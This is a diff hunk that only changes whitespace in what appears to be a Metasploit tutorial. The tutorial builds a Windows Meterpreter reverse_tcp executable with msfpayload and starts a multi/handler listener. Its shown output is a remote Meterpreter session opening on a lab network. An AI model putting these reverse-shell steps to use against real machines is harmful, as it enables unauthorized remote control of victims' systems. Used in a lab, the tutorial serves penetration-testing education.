@@ -72,59 +72,59 @@ On the attacker's box, I run msfpayload like the following (or msfvenom, whateve
 
 
 ```bash
-$ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 X > /tmp/iambad.exe  
-Created by msfpayload (http://www.metasploit.com).  
-Payload: windows/meterpreter/reverse_tcp  
-Length: 287  
-Options: {"LHOST"=>"192.168.1.123", "LPORT"=>"4444"}  
+$ ./msfpayload windows/meterpreter/reverse_tcp lhost=192.168.1.123 lport=4444 X > /tmp/iambad.exe
+Created by msfpayload (http://www.metasploit.com).
+Payload: windows/meterpreter/reverse_tcp
+Length: 287
+Options: {"LHOST"=>"192.168.1.123", "LPORT"=>"4444"}
 ```
 
 **Step 2: I copy my executable payload to Box B (my victim machine)**
- 
+
 This step requires no further explanation.
 
 **Step 3: I set up my payload handler on box A (the attacker's box):**
 
 ```bash
-$ ./msfconsole -q  
-msf > use exploit/multi/handler  
-msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
-payload => windows/meterpreter/reverse_tcp  
+$ ./msfconsole -q
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
 msf exploit(handler) > set lhost 192.168.1.123
-lhost => 192.168.1.123 
-msf exploit(handler) > set lport 4444  
-lport => 4444  
-msf exploit(handler) > run  
-  
-[*] Started reverse handler on 192.168.1.123:4444  
-[*] Starting the payload handler...  
+lhost => 192.168.1.123
+msf exploit(handler) > set lport 4444
+lport => 4444
+msf exploit(handler) > run
+
+[*] Started reverse handler on 192.168.1.123:4444
+[*] Starting the payload handler...
 ```
 
 **Step 4: I double-click on the malicious executable**
- 
+
 This step requires no further explanation.
- 
+
 **Step 5: I should see a meterpreter/payload session on box A (the attacker's box)**
- 
+
 Like this:
 
 
 ```bash
-$ ./msfconsole -q  
-msf > use exploit/multi/handler  
-msf exploit(handler) > set payload windows/meterpreter/reverse_tcp  
-payload => windows/meterpreter/reverse_tcp  
+$ ./msfconsole -q
+msf > use exploit/multi/handler
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
 msf exploit(handler) > set lhost 192.168.1.123
 lhost => 192.168.1.123
-msf exploit(handler) > set lport 4444  
-lport => 4444  
-msf exploit(handler) > run  
-  
-[*] Started reverse handler on 192.168.1.123:4444  
-[*] Starting the payload handler...  
-[*] Sending stage (770048 bytes) to 192.168.1.80  
-[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500  
-meterpreter >  
+msf exploit(handler) > set lport 4444
+lport => 4444
+msf exploit(handler) > run
+
+[*] Started reverse handler on 192.168.1.123:4444
+[*] Starting the payload handler...
+[*] Sending stage (770048 bytes) to 192.168.1.80
+[*] Meterpreter session 1 opened (192.168.1.123:4444 -> 192.168.1.80:1138) at 2014-10-22 19:03:43 -0500
+meterpreter >
 ```
 
 The meterpreter prompt means you are currently interacting with the payload.
